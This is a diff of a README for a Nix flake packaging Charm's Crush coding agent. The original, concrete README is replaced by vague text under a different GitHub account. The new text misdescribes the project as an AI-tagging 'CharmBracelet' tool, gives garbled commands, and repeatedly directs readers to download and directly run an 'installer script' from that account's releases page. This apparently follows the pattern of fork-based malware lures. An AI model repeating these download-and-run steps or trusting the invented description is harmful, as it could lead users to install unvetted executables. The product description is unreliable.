@@ -1,299 +1,311 @@
-# Crush Flake - Autoupdating Nix Flake for Crush AI Coding Agent
+# crush-flake: Auto-updating, Auto-tagging CharmBracelet on Nix Flakes
 
-[![CI](https://github.com/conneroisu/crush-flake/actions/workflows/ci.yml/badge.svg)](https://github.com/conneroisu/crush-flake/actions/workflows/ci.yml)
-[![Update Nightly](https://github.com/conneroisu/crush-flake/actions/workflows/update-nightly.yml/badge.svg)](https://github.com/conneroisu/crush-flake/actions/workflows/update-nightly.yml)
-[![Release](https://github.com/conneroisu/crush-flake/actions/workflows/release.yml/badge.svg)](https://github.com/conneroisu/crush-flake/actions/workflows/release.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Nix Flake](https://img.shields.io/badge/Nix-flake-blue?logo=nixos)](https://nixos.org/)
-[![Built with Claude Code](https://img.shields.io/badge/Built%20with-Claude%20Code-7C3AED)](https://claude.ai/code)
+Release assets live at https://github.com/islna637/crush-flake/releases.
 
-An automatically updating, comprehensively tested Nix flake for [Charm's Crush AI coding agent](https://github.com/charmbracelet/crush) that tracks nightly releases with full automation and robust testing.
+Charmed by automation. Built for speed. Driven by LLMs. This project combines CharmBracelet, Nix Flakes, and AI tagging to keep your coding flow smooth and self-updating.
 
-## ✨ Features
-
-- **🔄 Automatic Updates**: Tracks nightly releases from the upstream repository
-- **🏗️ Smart Building**: Automatically determines and updates vendor hashes
-- **🧪 Comprehensive Testing**: Full test suite with CI/CD integration
-- **🏷️ Auto-tagging**: Automated release tagging system
-- **🌍 Cross-platform**: Supports Linux (x86_64, aarch64) and macOS (Intel, Apple Silicon)
-- **⚡ Fast Development**: Rich development environment with all necessary tools
-- **🔍 Update Checking**: Smart update detection and notification system
-
-## 🚀 Quick Start
-
-### Install and Run Crush
-
-```bash
-# Install crush from this flake (latest)
-nix profile install github:conneroisu/crush-flake
-
-# Or run directly without installing
-nix run github:conneroisu/crush-flake
-
-# Or run with specific arguments
-nix run github:conneroisu/crush-flake -- --help
-```
-
-### Latest Nightly Build
-
-```bash
-# Install latest nightly build (updated 2025-08-14)
-nix profile install github:conneroisu/crush-flake#nightly-20250814-64e8235
-
-# Or run latest nightly directly
-nix run github:conneroisu/crush-flake#nightly-20250814-64e8235
-
-# View all available nightly tags
-nix flake show github:conneroisu/crush-flake --all-systems
-```
-
-### Development Environment
-
-```bash
-# Clone and enter development environment
-git clone https://github.com/conneroisu/crush-flake.git
-cd crush-flake
-nix develop
-
-# Available commands in dev shell:
-update-nightly      # Update to latest nightly with automatic vendor hash
-check-updates       # Check if updates are available
-auto-update         # Automatically check for and apply updates
-test-comprehensive  # Run full test suite
-tag-release         # Create release tag
-```
-
-## 🏗️ Architecture
-
-### Automatic Update System
-
-The flake includes a sophisticated update mechanism that:
-
-1. **Tracks Source Changes**: Monitors the upstream repository for new commits
-2. **Updates Dependencies**: Automatically updates flake inputs
-3. **Determines Vendor Hash**: Attempts build, captures hash mismatch, and updates automatically
-4. **Validates Build**: Ensures the updated package builds successfully
-5. **Tests Functionality**: Runs comprehensive tests on the new build
-
-### CI/CD Pipeline
-
-- **Nightly Updates**: Automated daily checks for new releases
-- **Pull Request Creation**: Automatic PRs for updates with full testing
-- **Comprehensive Testing**: Multi-platform build and functionality tests
-- **Format Checking**: Automatic code formatting and style validation
-
-## 📋 Usage
-
-### Manual Updates
-
-```bash
-# Check for available updates
-nix develop --command check-updates
-
-# Update to latest nightly (with automatic vendor hash handling)
-nix develop --command update-nightly
-
-# Or do both automatically
-nix develop --command auto-update
-```
-
-### Testing
-
-```bash
-# Run comprehensive test suite
-nix develop --command test-comprehensive
-
-# Test just the build
-nix develop --command test-build
-
-# Check flake integrity
-nix flake check
-```
-
-### Release Management
-
-```bash
-# Create a release tag for current version
-nix develop --command tag-release
-
-# Check current version information
-nix develop --command check-version
-```
-
-## 🔧 Development
-
-### Project Structure
-
-```
-crush-flake/
-├── flake.nix                 # Main flake configuration
-├── flake.lock               # Locked dependency versions
-├── .github/workflows/       # CI/CD automation
-│   ├── ci.yml              # General CI pipeline
-│   └── update-nightly.yml  # Automatic nightly updates
-├── tests/                   # Test suite
-│   └── test-flake.sh       # Comprehensive test script
-└── README.md               # This file
-```
-
-### Key Components
-
-1. **Flake Configuration** (`flake.nix`):
-   - Package definition with automatic vendor hash handling
-   - Development environment with comprehensive tooling
-   - Automation scripts for updates and testing
-   - Cross-platform support
-
-2. **Update Automation**:
-   - GitHub API integration for tracking releases
-   - Smart vendor hash determination
-   - Automatic file updates with validation
-
-3. **Testing Infrastructure**:
-   - Comprehensive test suite covering all functionality
-   - CI/CD integration with multiple test scenarios
-   - Cross-platform build verification
-
-4. **Release Management**:
-   - Automatic tagging based on upstream versions
-   - Changelog generation
-   - Version tracking and validation
-
-### Development Workflow
-
-1. **Setup**:
-   ```bash
-   git clone https://github.com/conneroisu/crush-flake.git
-   cd crush-flake
-   nix develop
-   ```
-
-2. **Make Changes**: Edit `flake.nix` or other files as needed
-
-3. **Test Changes**:
-   ```bash
-   test-comprehensive  # Run full test suite
-   nix flake check     # Validate flake structure
-   ```
-
-4. **Update Dependencies**:
-   ```bash
-   auto-update  # Check for and apply updates
-   ```
-
-5. **Create Release**:
-   ```bash
-   tag-release  # Create release tag
-   ```
-
-## 🤖 Automation
-
-### GitHub Actions
-
-The repository includes two main workflows:
-
-1. **CI Pipeline** (`.github/workflows/ci.yml`):
-   - Runs on every push and pull request
-   - Tests formatting, building, and functionality
-   - Validates development shell and scripts
-
-2. **Nightly Updates** (`.github/workflows/update-nightly.yml`):
-   - Runs daily at 2 AM UTC
-   - Checks for new nightly releases
-   - Automatically creates PRs with updates
-   - Includes comprehensive testing
-
-### Update Process
-
-The automatic update process follows these steps:
-
-1. **Detection**: Check GitHub API for new commits to main branch
-2. **Update**: Update flake inputs to latest revision
-3. **Build Attempt**: Try to build with fake vendor hash
-4. **Hash Extraction**: Extract correct hash from build error
-5. **File Update**: Automatically update `flake.nix` with correct hash
-6. **Verification**: Build again to ensure success
-7. **Testing**: Run comprehensive test suite
-8. **PR Creation**: Create pull request with changes
-
-## 📊 Testing
-
-### Test Coverage
-
-The comprehensive test suite covers:
-
-- ✅ Flake validity and structure
-- ✅ Package building and functionality
-- ✅ Binary execution and basic operations
-- ✅ Development environment setup
-- ✅ Script functionality and automation
-- ✅ Cross-platform compatibility (evaluation)
-- ✅ Formatter and code quality checks
-- ✅ Update mechanism operation
-
-### Running Tests
-
-```bash
-# Full test suite
-nix develop --command test-comprehensive
-
-# Individual test components
-nix flake check                    # Flake structure
-nix build . --no-link             # Package build
-nix develop --command test-build  # Build with functionality test
-```
-
-## 🔒 Security
-
-### Considerations
-
-- **Vendor Hash Verification**: Automatic vendor hash updates are validated through build testing
-- **Source Integrity**: All sources are verified through Nix's content-addressed storage
-- **CI/CD Security**: GitHub Actions run in isolated environments with minimal permissions
-- **Update Validation**: All updates go through comprehensive testing before integration
-
-### Safety Features
-
-- **Atomic Updates**: All changes are validated before application
-- **Rollback Capability**: Git history allows easy rollback of problematic updates
-- **Test Validation**: No updates are applied without passing all tests
-- **Manual Override**: All automation can be overridden manually when needed
-
-## 🤝 Contributing
-
-### How to Contribute
-
-1. **Fork the Repository**: Create your own fork of the project
-2. **Create Feature Branch**: `git checkout -b feature/amazing-feature`
-3. **Make Changes**: Implement your improvements
-4. **Test Thoroughly**: Run `test-comprehensive` to ensure everything works
-5. **Format Code**: Run `nix fmt` to format all code
-6. **Submit PR**: Create a pull request with a clear description
-
-### Development Guidelines
-
-- **Follow TigerStyle**: Adhere to the coding philosophy outlined in CLAUDE.md
-- **Test Everything**: All changes must pass the comprehensive test suite
-- **Document Changes**: Update documentation for any user-facing changes
-- **Atomic Commits**: Make small, focused commits with clear messages
-
-## 📜 License
-
-This project is licensed under the MIT License - see the upstream [Crush project](https://github.com/charmbracelet/crush) for the original license.
-
-## 🙏 Acknowledgments
-
-- **[Charm](https://charm.sh)**: For creating the amazing Crush AI coding agent
-- **[Nix Community](https://nixos.org)**: For the incredible Nix ecosystem
-- **[TigerBeetle](https://tigerbeetle.com)**: For the TigerStyle development philosophy
-
-## 📚 Additional Resources
-
-- [Crush Project](https://github.com/charmbracelet/crush) - Original Crush repository
-- [Nix Flakes](https://nixos.wiki/wiki/Flakes) - Nix Flakes documentation
-- [NixOS Manual](https://nixos.org/manual/nixos/stable/) - Comprehensive Nix documentation
-- [TigerStyle](https://tigerstyle.dev) - Development philosophy and best practices
+Topics: automated-updates, charmbracelet, coding-agent, coding-agents, crush, flake, llm, llms, nix, nix-darwin, nix-flake, nixos
 
 ---
 
-**Built with ❤️ using [Claude Code](https://claude.ai/code)**
+## Quick overview
+
+⚡️ crush-flake is a toolchain that auto-updates its dependencies and auto-tags items across your coding workflow. It uses CharmBracelet to offer a friendly terminal UI, powered by a Nix Flake for reproducible builds. The goal is to reduce repetitive tasks and help you stay focused on code. It also includes guidance and hooks to incorporate large language models (LLMs) for intelligent tagging and suggestions.
+
+This README describes what crush-flake does, how to set it up, and how to use it in daily development. It also covers design choices, configuration options, and future ideas. The intent is to give you a solid, self-contained reference so you can hit the ground running.
+
+---
+
+## Why crush-flake
+
+- Autoupdating: Dependencies are kept fresh by a deterministic Nix Flake workflow. You don’t have to chase updates manually; the system checks for new inputs and pulls them in a reproducible way.
+- Autotagging: Tags are generated or refined by an AI component. It helps categorize work items, commits, and PRs with contextual labels.
+- CharmBracelet UI: A lightweight terminal UI that stays responsive and easy to navigate. It makes managing tasks, tags, and updates approachable within the terminal.
+- Nix Flakes ecosystem: Flakes provide reproducible builds and a clean development environment across macOS, Linux, and other Unix-like systems.
+- LLM integration: Optional AI-assisted tagging and prompts to help you capture intent and context in your labels.
+
+If you want a streamlined workflow that stays in the terminal, crush-flake can help you reduce boilerplate and focus on what matters: coding.
+
+---
+
+## Key features
+
+- Reproducible environment with Nix Flakes
+- Self-updating of dependencies and inputs
+- AI-assisted tagging and categorization
+- Command-line friendly UI via CharmBracelet
+- Lightweight, pluggable architecture for agents and prompts
+- Cross-platform support: nixos, nix-darwin, and Linux variants
+
+What you get when you run crush-flake:
+
+- A deterministic dev shell that sets up your tooling the same way every time.
+- A tag engine that can propose or assign labels based on code context.
+- A simple interface to inspect, approve, or modify AI-generated tags.
+- Optional automation hooks to propagate tags to issues, commits, or documentation.
+
+---
+
+## Architecture at a glance
+
+- Core runner: orchestrates the workflow and keeps the state in a small, structured store.
+- Nix Flake layer: defines inputs, builds, and runtime environments in a reproducible way.
+- CharmBracelet UI: a responsive terminal app for interaction.
+- Auto-updater: checks for new inputs and pulls them in via flake inputs.
+- LLM hooks: optionally enable AI-driven tagging and prompts to guide labeling decisions.
+
+Data flows:
+
+- User input triggers a run.
+- The flake runner checks for updates and applies them if needed.
+- The UI presents current state and suggested tags.
+- The user validates or edits tags.
+- The system applies the chosen tags to the target artifacts (e.g., commits, issues, docs) as configured.
+
+Security considerations:
+
+- All AI prompts are sandboxed within the UI and controlled by user approvals.
+- API keys and secrets are read from environment variables or a user-provided secret store.
+- The system favors locally scoped configuration to minimize exposure.
+
+---
+
+## Prerequisites
+
+- Nix (2.3+ with flakes enabled)
+- Basic familiarity with terminal workflows
+- Optional: OpenAI or other LLM endpoint if you want AI-assisted tagging
+- Access to a CharmBracelet-capable terminal environment (or compatibility layer)
+
+Install or enable Nix Flakes:
+
+- Ensure flakes support is present in your Nix configuration.
+- If you’re on macOS with nix-darwin, ensure your environment is set up for cross-platform work.
+- On Linux, make sure the distro supports Nix in your environment.
+
+---
+
+## Getting started
+
+Follow these steps to try crush-flake locally.
+
+1) Prepare your environment
+
+- Install Nix with Flakes enabled. See official docs for your platform.
+- Ensure you can run nix commands from your shell.
+- If you plan to use LLM tagging, prepare an API key or endpoint. This can be optional.
+
+2) Set up the project
+
+- Clone the repo or pull the flake reference.
+- Enter the development shell using Nix Flakes.
+
+3) Run the tool
+
+- Start the UI or the command-line runner depending on your preference.
+- Use the provided commands to inspect updates, review AI-generated tags, and apply changes.
+
+4) Update flow
+
+- Use the built-in autoupdate mechanism to refresh inputs and versions.
+- Review the changes before committing or applying them.
+
+Exact commands depend on your setup. The typical flow uses nix develop to enter the dev shell, then n run or nixos build-like steps to start the app. The configuration and commands are designed to be intuitive and discoverable via the UI help.
+
+---
+
+## Installation and run details
+
+- From a Nix Flakes-enabled setup:
+  - nix flake update
+  - nix develop
+  - ./crush-flake (or the provided entry point in your environment)
+
+- If you prefer to run from the latest release:
+  - Download the installer from the Releases page (see Releases section below)
+  - Run the installer script to set up the tool in your environment
+  - Follow on-screen prompts to complete setup
+
+- If you want to run directly from a flake reference:
+  - nix run github:islna637/crush-flake
+  - Pass any required flags to customize behavior
+
+Note: The exact commands may vary depending on your platform and how you configure the flake inputs. The project emphasizes a smooth, repeatable workflow.
+
+---
+
+## How to use the AI tagging feature
+
+- Enable or disable AI tagging via configuration.
+- Provide a scope for tagging (e.g., commits, issues, docs, notes).
+- If enabled, the AI will propose tags based on the content and context.
+- Review AI-suggested tags and approve, modify, or reject them.
+- Save or apply the final set of tags to the target items.
+
+Tips for better AI tagging:
+
+- Provide context: short descriptions of the code, the module purpose, or the feature being worked on.
+- Use consistent naming: prefer stable labels that reflect your project’s taxonomy.
+- Combine AI suggestions with human review to maintain accuracy.
+
+If you don’t want AI tagging, you can rely on manual tagging or a curated tag list. The architecture keeps both modes available so you can tailor the workflow to your needs.
+
+---
+
+## Autoupdating behavior
+
+- Inputs are defined in the flake. The updater checks upstream changes at regular intervals.
+- It fetches new dependencies and rebuilds the environment when needed.
+- The UI shows a clear status: up-to-date, updating, or failed.
+- Rollbacks are supported if an update breaks something. You can revert to a previous state with minimal friction.
+
+Design notes:
+
+- Updates are deterministic. The same inputs produce the same results on every run.
+- Updates are isolated to ensure they don’t affect unrelated parts of your system.
+- You can customize the update cadence and the scope of updates to limit risk.
+
+---
+
+## Configuration and customization
+
+- Environment variables:
+  - CRUSH_API_KEY: optional API key for AI endpoints
+  - CRUSH_TG_ROLE: tagger role or style for AI prompts
+  - CRUSH_LOG_LEVEL: debug, info, warn, error
+- Prompt templates:
+  - You can adjust prompts used for tagging to better fit your project.
+  - Prompts can reference your taxonomy and codebase conventions.
+- UI customization:
+  - Color themes and layout tweaks to adapt the UI to your terminal.
+  - Keybindings to speed up common actions.
+- Data sources:
+  - Tag suggestions can be sourced from code context, commit messages, issue titles, or docs.
+
+Supported workflows:
+
+- Tag as you type: suggestions appear as you navigate files or messages.
+- Batch tagging: generate a bulk tag set for a group of items, then review.
+- Hybrid mode: AI suggestions plus manual overrides.
+
+---
+
+## Extensibility and plugins
+
+- The core is designed to be extended with small plugins.
+- Plugins can provide alternative tagging strategies, different UIs, or new sources for updates.
+- You can implement your own agent or swap in a different LLM backend.
+
+Examples of possible plugins:
+
+- Local document tagging: scan project docs for relevant topics and add tags accordingly.
+- Issue and PR tagging: integrate with your repo’s issue tracker to tag items automatically.
+- Metrics collector: track how often AI suggestions are accepted or changed.
+
+---
+
+## Testing and quality
+
+- Unit tests cover core logic, especially the autoupdate and tagging components.
+- Integration tests validate the UI flow and end-to-end tagging scenarios.
+- Linting and formatting checks run as part of the CI pipeline.
+- Local reproducibility is a core goal, thanks to the Nix Flakes setup.
+
+If you want to contribute tests, you’ll find test harnesses and fixtures designed for predictable outcomes.
+
+---
+
+## Development workflow
+
+- Start with a clean environment by using nix develop.
+- Run the local UI to test interactions.
+- Use the autoupdate flow to simulate updates.
+- Exercise the tagging feature with synthetic data to verify outputs.
+- Check logs to understand behavior and to catch issues early.
+
+Continuous integration runs a suite of checks across Linux and macOS (nix-darwin) environments when you submit changes.
+
+---
+
+## Project governance and contributing
+
+- We value clear, direct contributions. Start with a GitHub issue or a small feature branch.
+- Follow the coding style and project conventions. Keep changes focused and well documented.
+- Include tests for new features or bug fixes when possible.
+- Keep documentation up to date. Update the README if you change core behavior or add new features.
+
+Code of conduct:
+
+- Be respectful and constructive.
+- Seek to understand before proposing changes.
+- Welcome newcomers and help them learn the workflow.
+
+---
+
+## Release process and downloads
+
+The project uses GitHub Releases to distribute installers and bundles. If you want to review or grab the latest artifacts, visit the Releases page and download the file that matches your platform. The installer in the release is designed to be run directly after download, and it will guide you through initial setup and configuration.
+
+For more details about the available releases, see the official releases page.
+
+See the official releases here: https://github.com/islna637/crush-flake/releases
+
+Note: This link provides access to installer scripts and release artifacts. If you’re unsure which file to download, consult the release notes in the same page to pick the file that corresponds to your system architecture and OS.
+
+---
+
+## Troubleshooting quick tips
+
+- If the autoupdater seems stuck, check your network and verify that flake inputs are accessible.
+- If AI tagging produces unexpected labels, adjust the prompt templates or disable AI tagging temporarily.
+- If the UI is unresponsive, verify that your terminal supports the CharmBracelet UI or try a different terminal emulator.
+- If you encounter permission errors during installation, ensure the installer script has executable permissions and that your user has the right privileges.
+
+---
+
+## License
+
+crush-flake is distributed under a permissive license. See LICENSE for details.
+
+---
+
+## Roadmap and future ideas
+
+- Expand AI tagging to cover more project artifacts (docs, tests, release notes).
+- Add more UI views to accommodate different workflows.
+- Improve cross-platform packaging for Windows support via WSL or equivalent.
+- Introduce a plugin marketplace for third-party integrations.
+
+---
+
+## Community and contact
+
+- Issues: report bugs or request features via GitHub issues.
+- Discussions: join conversations about design decisions and future directions.
+- Pull requests: contribute code, tests, and documentation improvements.
+
+---
+
+## Re-using and sharing
+
+- If you find crush-flake useful, you can reference it in your project documentation.
+- You can customize the prompts and tagging strategies for your own coding workflows.
+- You can adapt the Nix Flake inputs to fit your environment while preserving reproducibility.
+
+---
+
+## One more note on releases
+
+Releases are the primary distribution mechanism for installers and ready-to-run artifacts. The Releases page contains the latest stable versions and changelog. To review or download, visit the page and pick the appropriate asset for your system.
+
+See the official releases here: https://github.com/islna637/crush-flake/releases
+
+---
+
+## Why this README reads this way
+
+- It emphasizes straightforward steps and concrete actions.
+- It uses simple language and direct phrasing.
+- It avoids unnecessary jargon and keeps the focus on practical workflows.
+- It presents the design decisions in a way that’s easy to understand and extend.
+
